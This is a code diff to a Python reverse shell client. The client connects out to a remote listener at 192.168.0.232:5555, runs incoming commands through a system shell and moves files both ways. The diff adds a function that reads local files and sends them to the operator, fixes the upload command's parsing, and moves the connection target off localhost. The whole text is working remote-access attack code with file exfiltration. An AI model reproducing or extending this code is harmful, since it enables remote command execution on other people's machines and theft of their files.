@@ -32,6 +32,9 @@ def download_file(file_name):
     s.settimeout(None)
     f.close()
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
 
 def shell():
     while True:
@@ -45,7 +48,9 @@ def shell():
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
         elif command[:6] == 'upload':
-            download_file(command[:7])
+            download_file(command[7:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
@@ -54,5 +59,5 @@ def shell():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
+s.connect(('192.168.0.232', 5555))
 shell()
